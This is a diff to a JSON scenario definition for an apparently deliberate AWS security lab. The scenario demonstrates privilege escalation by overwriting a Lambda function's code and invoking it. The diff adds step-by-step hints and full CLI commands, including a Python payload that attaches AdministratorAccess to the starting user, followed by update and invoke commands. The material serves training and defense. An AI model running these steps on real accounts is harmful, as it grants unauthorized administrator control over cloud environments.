@@ -1,5 +1,5 @@
 {
-  "displayName": "Privilege Escalation via lambda:UpdateFunctionCode + lambda:InvokeFunction",
+  "displayName": "Lambda Code Update + Invocation to Admin",
   "name": "lambda-004-lambda-updatefunctioncode+lambda-invokefunction",
   "description": "Modifying existing Lambda function code and manually invoking it to execute malicious logic under privileged execution role",
   "costEstimate": "$0/mo",
@@ -31,16 +31,18 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-004-lambda-updatefunctioncode+lambda-invokefunction"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/lambda-004-lambda-updatefunctioncode+lambda-invokefunction",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "lambda:UpdateFunctionCode",
+        "principal": "pl-prod-lambda-004-to-admin-starting-user",
         "resource": "arn:aws:lambda:*:*:function/pl-prod-lambda-004-to-admin-target-lambda",
         "description": "replace the existing Lambda function code with a malicious payload"
       },
       {
         "permission": "lambda:InvokeFunction",
+        "principal": "pl-prod-lambda-004-to-admin-starting-user",
         "resource": "arn:aws:lambda:*:*:function/pl-prod-lambda-004-to-admin-target-lambda",
         "description": "immediately trigger execution of the malicious payload under the function's privileged role"
       }
@@ -48,14 +50,17 @@
     "helpful": [
       {
         "permission": "lambda:GetFunction",
+        "principal": "pl-prod-lambda-004-to-admin-starting-user",
         "purpose": "discover Lambda function details including handler name and execution role"
       },
       {
         "permission": "lambda:ListFunctions",
+        "principal": "pl-prod-lambda-004-to-admin-starting-user",
         "purpose": "discover available Lambda functions to target"
       },
       {
         "permission": "iam:GetRole",
+        "principal": "pl-prod-lambda-004-to-admin-starting-user",
         "purpose": "view Lambda execution role permissions to identify high-value targets"
       }
     ]
@@ -131,23 +136,29 @@
         "label": "lambda:UpdateFunctionCode",
         "description": "Replace the Lambda function's existing code with a malicious Python payload that will attach AdministratorAccess to the starting user when invoked.\n",
         "hints": [
-          "You can modify the code of existing Lambda functions.",
-          "Look for Lambda functions whose execution roles have elevated permissions.",
-          "Combining code update and invocation permissions lets you execute arbitrary code with the Lambda's privileges immediately.",
+          "Use lambda:ListFunctions to discover what Lambda functions exist in the account, then use lambda:GetFunction to inspect a target function's configuration.",
+          "Look at the execution role ARN in the function's Configuration block -- use iam:GetRole to check what policies that role carries.",
+          "Once you identify a function whose execution role has elevated permissions, think about what you can do with the ability to replace its code.",
+          "Your malicious code file must match the handler name exactly -- the handler field tells you both the filename and the entry point function name.",
+          "Package your payload as a zip file and push it using the update-function-code subcommand, referencing the zip with the fileb:// prefix.",
           "Browse to https://pathfinding.cloud/paths/lambda-004 for technique details."
         ],
         "commands": [
+          {
+            "description": "List Lambda functions to find targets",
+            "command": "aws lambda list-functions --query 'Functions[*].[FunctionName,Role]' --output table"
+          },
           {
             "description": "Get current function details (handler name and execution role)",
             "command": "aws lambda get-function --function-name pl-prod-lambda-004-to-admin-target-lambda"
           },
           {
             "description": "Create malicious Lambda payload",
-            "command": "cat > lambda_function.py << 'EOF'\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(\n        UserName='pl-prod-lambda-004-to-admin-starting-user',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'statusCode': 200, 'body': 'Policy attached'}\nEOF\nzip malicious_lambda.zip lambda_function.py\n"
+            "command": "cat > /tmp/lambda_function.py << 'EOF'\nimport boto3\n\ndef lambda_handler(event, context):\n    iam = boto3.client('iam')\n    iam.attach_user_policy(\n        UserName='pl-prod-lambda-004-to-admin-starting-user',\n        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'\n    )\n    return {'statusCode': 200, 'body': 'Policy attached'}\nEOF\ncd /tmp && zip lambda_function.zip lambda_function.py && cd -\n"
           },
           {
             "description": "Update the Lambda function code with the malicious payload",
-            "command": "aws lambda update-function-code --function-name pl-prod-lambda-004-to-admin-target-lambda --zip-file fileb://malicious_lambda.zip"
+            "command": "aws lambda update-function-code --function-name pl-prod-lambda-004-to-admin-target-lambda --zip-file fileb:///tmp/lambda_function.zip"
           }
         ]
       },
@@ -156,14 +167,24 @@
         "to": "target-role",
         "label": "lambda:InvokeFunction",
         "description": "Invoke the Lambda function to immediately execute the malicious payload under the administrative execution role, attaching AdministratorAccess to the starting user.\n",
+        "hints": [
+          "Wait a few seconds after updating the function code before invoking -- Lambda needs to finish deploying the new package.",
+          "Invoke the function directly using the invoke subcommand with an empty JSON payload; the response is written to a local output file.",
+          "Check the output file after invocation to confirm the payload executed successfully and the policy was attached.",
+          "IAM policy changes can take up to 15 seconds to propagate -- verify admin access after a short wait."
+        ],
         "commands": [
           {
             "description": "Invoke the Lambda function to execute the malicious payload",
-            "command": "aws lambda invoke --function-name pl-prod-lambda-004-to-admin-target-lambda --payload '{}' response.json && cat response.json"
+            "command": "aws lambda invoke --function-name pl-prod-lambda-004-to-admin-target-lambda --payload '{}' /tmp/response.json && cat /tmp/response.json"
           },
           {
             "description": "Verify administrator access was granted",
             "command": "aws iam list-attached-user-policies --user-name pl-prod-lambda-004-to-admin-starting-user"
+          },
+          {
+            "description": "Confirm admin access by listing IAM users",
+            "command": "aws iam list-users --max-items 3 --output table"
           }
         ]
       }
